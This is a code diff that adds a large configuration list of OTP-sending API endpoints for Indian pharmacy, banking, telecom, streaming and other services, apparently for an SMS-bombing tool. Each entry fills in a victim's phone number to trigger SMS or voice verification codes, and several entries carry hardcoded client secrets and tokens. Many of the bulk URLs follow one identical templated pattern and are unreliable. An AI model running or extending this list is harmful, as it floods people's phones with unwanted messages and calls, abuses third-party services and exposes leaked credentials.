+    {"name": "olx", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST", "headers": {"Content-Type": "application/json", "x-panamera-client-id": "web-mobile", "Origin": "https://www.olx.in"}, "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'},
+    {"name": "zepto_v2", "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "x-csrf-secret": "uD0aoNYI_ZA", "platform": "WEB", "Origin": "https://www.zepto.com"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763", "Origin": "https://www.aakash.ac.in"}, "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'},
 
-    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com"},
-     "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},
-
-    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"},
-     "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
-
-    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"},
-     "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
-
-    # ══════════════ BULK (Auto-generated from your list) ══════════════
-    # Yeh saari APIs aapki list se hain — automatically loop se add ho jayengi
+    # ═══ BULK APIs (from your list, exact same) ═══
+    {"name": "1mg_sms", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
+    {"name": "1mg_voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "1mg_wa", "url": "https://1mg.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "pharmeasy_sms", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "pharmeasy_voice", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","otp_on_call":true}}'},
+    {"name": "netmeds_sms", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "practo_sms", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "curefit_sms", "url": "https://www.cure.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "cultfit_sms", "url": "https://www.cult.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "healthifyme_sms", "url": "https://www.healthifyme.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "apollo247_sms", "url": "https://www.apollo247.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "mfine_sms", "url": "https://www.mfine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "docsapp_sms", "url": "https://www.docsapp.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "lybrate_sms", "url": "https://www.lybrate.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "portea_sms", "url": "https://www.portea.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "byjus_sms", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "unacademy_sms", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "vedantu_sms", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "doubtnut_sms", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
+    {"name": "toppr_sms", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "whitehatjr_sms", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "upgrad_sms", "url": "https://www.upgrad.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "swiggy_sms", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "swiggy_voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "zomato_sms", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}"},
+    {"name": "dominOs_sms", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"PhoneNo={p}"},
+    {"name": "bigbasket_sms", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
+    {"name": "zepto_sms", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "blinkit_sms", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "dunzo_sms", "url": "https://www.dunzo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "milkbasket_sms", "url": "https://www.milkbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "countrydelight_sms", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android"}}'},
+    {"name": "licious_sms", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "freshtohome_sms", "url": "https://www.freshtohome.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "godrej_sms", "url": "https://www.godrejnaturesbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "spencer_sms", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "moreretail_sms", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "paytm_sms", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
+    {"name": "phonepe_sms", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "gpay_sms", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
+    {"name": "bhim_sms", "url": "https://www.bhim.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mobikwik_sms", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "freecharge_sms", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "uber_sms", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "ola_sms", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "rapido_sms", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "makemytrip_sms", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "goibibo_sms", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "irctc_sms", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "redbus_sms", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "oyo_sms", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "treebo_sms", "url": "https://www.treebo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "cleartrip_sms", "url": "https://www.cleartrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "easemytrip_sms", "url": "https://www.easemytrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "yatra_sms", "url": "https://www.yatra.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "ixigo_sms", "url": "https://www.ixigo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "netflix_sms", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "primevideo_sms", "url": "https://www.primevideo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hotstar_sms", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "sonyliv_sms", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "zee5_sms", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "jiocinema_sms", "url": "https://www.jiocinema.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "voot_sms", "url": "https://www.voot.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "mxplayer_sms", "url": "https://www.mxplayer.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "altbalaji_sms", "url": "https://www.altbalaji.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "spotify_sms", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "gaana_sms", "url": "https://www.gaana.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "wynk_sms", "url": "https://www.wynk.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "jiosaavn_sms", "url": "https://www.jiosaavn.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "linkedin_sms", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "naukri_sms", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "indeed_sms", "url": "https://www.indeed.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "shine_sms", "url": "https://www.shine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "monster_sms", "url": "https://www.monster.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "timesjobs_sms", "url": "https://www.timesjobs.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "freshersworld_sms", "url": "https://www.freshersworld.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "upwork_sms", "url": "https://www.upwork.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "fiverr_sms", "url": "https://www.fiverr.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "freelancer_sms", "url": "https://www.freelancer.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "toptal_sms", "url": "https://www.toptal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "housing_sms", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
+    {"name": "magicbricks_sms", "url": "https://www.magicbricks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "99acres_sms", "url": "https://www.99acres.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "commonfloor_sms", "url": "https://www.commonfloor.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "nobroker_sms", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
+    {"name": "squareyards_sms", "url": "https://www.squareyards.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "pokerbaazi_sms", "url": "https://www.pokerbaazi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "my11circle_sms", "url": "https://www.my11circle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "dream11_sms", "url": "https://www.dream11.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "mpl_sms", "url": "https://www.mpl.live/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "paytmfirstgames_sms", "url": "https://firstgames.paytm.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "adda52_sms", "url": "https://www.adda52.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "rummycircle_sms", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jupiter_sms", "url": "https://jupiter.money/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
+    {"name": "groww_sms", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "zerodha_sms", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "angelone_sms", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "upstox_sms", "url": "https://upstox.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "5paisa_sms", "url": "https://www.5paisa.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "icicidirect_sms", "url": "https://www.icicidirect.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hdfcsec_sms", "url": "https://www.hdfcsec.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "sharekhan_sms", "url": "https://www.sharekhan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "motilaloswal_sms", "url": "https://www.motilaloswal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "kotaksec_sms", "url": "https://www.kotaksecurities.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "axisdirect_sms", "url": "https://www.axisdirect.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "iifl_sms", "url": "https://www.iifl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "edelweiss_sms", "url": "https://www.edelweiss.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jmfinancial_sms", "url": "https://www.jmfinancial.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "anandrathi_sms", "url": "https://www.anandrathi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "geojit_sms", "url": "https://www.geojit.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "sbilife_sms", "url": "https://www.sbilife.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hdfclife_sms", "url": "https://www.hdfclife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "icicipru_sms", "url": "https://www.iciciprulife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "maxlife_sms", "url": "https://www.maxlifeinsurance.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "tataaia_sms", "url": "https://www.tataaia.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bajajallianz_sms", "url": "https://www.bajajallianz.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "reliancenippon_sms", "url": "https://www.reliancenipponlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "adityabirla_sms", "url": "https://lifeinsurance.adityabirlacapital.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "pnbmetlife_sms", "url": "https://www.pnbmetlife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "kotaklife_sms", "url": "https://www.kotaklife.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "airtelbank_sms", "url": "https://www.airtel.in/bank/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "ippb_sms", "url": "https://www.ippbonline.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "finopay_sms", "url": "https://www.finopayments.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jiopay_sms", "url": "https://www.jiopaymentsbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "nsdlpay_sms", "url": "https://www.nsdlpaymentsbank.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "suryoday_sms", "url": "https://www.suryodaybank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "utkarsh_sms", "url": "https://www.utkarshbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "equitas_sms", "url": "https://www.equitasbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "cityunion_sms", "url": "https://www.cityunionbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "dcb_sms", "url": "https://www.dcbbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "tmb_sms", "url": "https://www.tmb.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "csb_sms", "url": "https://www.csb.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "esaf_sms", "url": "https://www.esafbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "fincare_sms", "url": "https://www.fincarebank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "janabank_sms", "url": "https://www.janabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jkbank_sms", "url": "https://www.jkbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "karnatakabank_sms", "url": "https://www.karnatakabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "keralagbank_sms", "url": "https://www.keralagbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "paytmbank_sms", "url": "https://www.paytmbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "airtel_thanks_sms", "url": "https://www.airtel.in/thanks/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jio_sms", "url": "https://www.jio.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "vi_sms", "url": "https://www.myvi.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bsnl_sms", "url": "https://www.bsnl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "tataplay_sms", "url": "https://www.tataplay.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "dishtv_sms", "url": "https://www.dishtv.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "airteldth_sms", "url": "https://www.airtel.in/dth/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jiofiber_sms", "url": "https://www.jio.com/fiber/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hathway_sms", "url": "https://www.hathway.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "den_sms", "url": "https://www.dennetworks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "siticable_sms", "url": "https://www.siticable.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
